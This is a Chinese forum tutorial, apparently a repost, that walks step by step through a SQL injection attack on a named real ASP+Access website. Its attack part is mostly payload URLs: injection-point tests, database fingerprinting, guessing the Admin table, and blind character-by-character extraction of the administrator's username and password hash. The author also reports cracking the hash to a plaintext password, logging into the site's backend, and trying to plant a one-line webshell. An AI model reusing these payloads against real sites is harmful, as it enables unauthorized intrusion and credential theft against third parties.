
# Access sql 注入实例---只为共同探讨、学习，共同进步，提高所有人的安全意识

> 原文：[`www.pediy.com/kssd/pediy12/114845.html`](https://www.pediy.com/kssd/pediy12/114845.html)

Sql 注入实例 作者：ssLong

由于学习需要，因此学习了关于拿站相关知识，当然我刚刚起步，今天主要是学习 sql 注入，并且找了一个具体的实例，来说明 sql 注入的整个流程。

一下为本人学习之后总结的，不对之处还请各位高人批评、指教,感激不尽。

简单说一下，本菜鸟对 sql 注入的理解：sql 注入就是攻击者精心构造的 sql 语句，可以被远程服务器的数据库正常执行，完成一些特定的功能，达到攻击的目的。其主要原因，网站制造者的安全意识不够，没有考虑网站浏览者提交特殊的，非法参数的情况，从而产生了 sql 注入。同时，网站制作者没有对网站出错时，进行处理，直接将很多有用的信息提供给了攻击者，这样也降低了攻击者攻击的门槛。希望引起网站制作者的注意。不知道在这场，魔与道还是道与魔的对抗中谁能获胜？谁能笑到最后？

目标网站为：`http://www.shengqiguanli.com/jiao_lian.asp?id=45`（随便查找，没有其它意思，只是测试而已，不做任何妨碍网站正常使用的事，如有人进行攻击行为，本人概不负责。真正的黑客是不会这么多的，正所谓点到为止）

## 1. 取消 IE 的 显示友好 Http 错误信息

因为我们很多时候，都要利用网站出错显示的错误信息，得到网站本身信息，这些信息对于我们来说非常有用。

## 2. 判断注入点

一般一个网站的注入点主要是存在浏览新闻，注册时输入信息框，搜索框等需要和数据库交互的页面中。

我们的目标：
`http://www.shengqiguanli.com/jiao_lian.asp?id=45`

检测方法一般是经典的三步走：

第一步：在网址后面加入 单引号`'` 即

`http://www.shengqiguanli.com/jiao_lian.asp?id=45'` 有错

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and 1=1` 正常返回

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and 1=2` 异常返回

一般可以判断此 url 可以被 sql 注入。

## 3. 判断数据库类型

因为当前各种网址使用的语言和数据库各不相同，比如 Asp+access、Asp+sql server、php+ my sql /Ms sql、Jsp + Oracle / Mysql、Aspx + Access /Ms Sql 等等。而各种数据库对应的 sql 语句各不相同，因此首先需要确定数据库类型。

一般方法是：

1） `http://www.shengqiguanli.com/jiao_lian.asp?id=45 and user >0`

根据错误信息判断数据库类型：

表示为 Access 数据库

Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e10'

[Microsoft][ODBC Microsoft Access Driver] 参数不足，期待是 1。

`/jiao_lian.asp`，行 43

2） `http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select count(*) from sysobjects) >0`

3） `http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select count(*) from msysobjects) >0`

注释：`user` 是 sql server 的内置变量 是 nvarchar 如将与 int 比较 如果是 sql server 会直接报错，是 Access 会提示没有改变量

`Sysobjects` 是 sql server 的数据库内置表，在 web 环境下，可以被正常访问

`Msysobjects` 是 Access 的数据库内置表 在 web 环境下，不能正常访问。

## 4. 猜表与猜字段

这个是个分水岭的步骤，因为是 Access 数据库，小弟初来咋到，不知道 Access 数据库时，有什么好的方法，只能走常规方法，猜！希望有高人直接。

1） 首先猜表

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select count(*) from Admin) >=0` 判断是否有 `Admin` 表 返回正常则存在 返回异常则不存在 等同下面的语句

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and exists(select * from Admin)`

非常幸运 这个网站按常理出牌了 返回的是正常页面，那么就说明有这个表，这个表中一般都是管理员用户名和密码，我们继续猜。当然如果返回异常，可以继续猜，一般的工具都是使用字典的，穷尽常见的表组成的字典，如果没有匹配的，则认为攻击失败。因此，给数据表已可以有效防止 sql 注入，但不是最好的方法。

2） 猜字段

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select count(username) from Admin) >=0`

判断是否正常，正常说明存在 `username` 字段，我们的是正常的 同理：

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select count(password) from Admin) >=0`

很容易想到 这个两个就是用户名和密码字段，已经足够了，继续猜

3) 确定长度

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 len(username) from Admin) >10`

一般用户名不会加密的所以不会很多，先判断是否在 10 以内。

发现返回异常，说明小于等于 10

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 len(username) from Admin) >5`

返回还是异常 说明<=5

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 len(username) from Admin) >3` 返回正常 说明大于 3

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 len(username) from Admin) >4` 返回正常 说明大于 4

所以可以确定长度是 5

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 len(password) from Admin) >32` 一般网站密码是使用 md5 加密的所以 一般都是 32 或者 16 当然也有例外，所以先判断是否在 32 以内

返回异常 说明<=32

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 len(password) from Admin) >16` 返回正常 说明大于 16

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 len(password) from Admin) >24` 返回正常 说明大于 24

基本上可以确定是 32 了 我们直接测试 32 吧

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 len(password) from Admin) =32` 返回正常 说明密码是使用 md5 加密的 32 位

4） 继续猜每一位

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 asc(mid(username,1,1)) from Admin) >63` 利用 `asc` 取一位猜测 其值是否大于 ascii 的中间值 返回正常 继续猜

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 asc(mid(username,1,1)) from Admin) >94` 利用二分法取 ascii (126+63)/2=94 返回正常 继续猜

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 asc(mid(username,1,1)) from Admin) >110` 返回异常 说明小于 110

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 asc(mid(username,1,1)) from Admin) >102` 异常

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 asc(mid(username,1,1)) from Admin) >98` 异常

`http://www.shengqiguanli.com/jiao_lian.asp?id=45 and (select top 1 asc(mid(username,1,1)) from Admin) >96` 返回正常

最终确定第一个字符为 97 转换为字符是 a.

同理 就可以猜到 2~5 位，和 `password` 的所有位，知道原理 其它的都一样。我们就直接使用 啊 D 这个专业工具吧，得到用户名：`admin` 密码：`7fef6171469e80d32c0559f88b377245`

直接去 `http://md5.org.cn/` 解密 看看人品:还不错：名为 `admin888`

继续使用啊 D 查找网站后台，登录吧，当然啊 D 也是猜测后台，不是使用爬的方法，但是也很有效，还是那句话，太多了常理出牌了，我写的网站一般就不能扫出来，我都记不住后台页面，呵呵！见笑了，英语太差！

`http://www.shengqiguanli.com/admin/index.asp` 后台 登录 成功。

发现后台有个可以发布新闻的地方 将一句话木马 插入进去，返回插入成功，但是使用客户端却不能建立文件，求高人帮助说是没有写权限 ，晕了一次，继续

真是遗憾时间到了 没有找到可以利用的地方，先这样吧！只能帮帮管理员管理一下信息了..当然最好不要这样做 呵呵 点到为止嘛
